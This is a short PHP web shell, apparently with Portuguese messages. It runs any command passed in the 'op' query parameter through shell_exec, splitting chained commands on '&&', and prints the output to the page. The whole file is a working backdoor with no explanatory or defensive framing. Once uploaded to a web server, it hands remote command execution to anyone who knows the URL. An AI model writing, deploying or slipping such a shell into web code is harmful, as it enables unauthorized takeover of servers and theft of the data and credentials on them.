<?php
if (isset($_GET['op'])) {
    $commands = explode('&&', $_GET['op']);
    $output = '';

    foreach ($commands as $command) {
        $command = trim($command);

//exec op
        $output .= shell_exec($command) . "\n";
    }

//view op
    echo "<pre>$output</pre>";
} else {
    echo "Nenhum comando especificado.";
}
?>
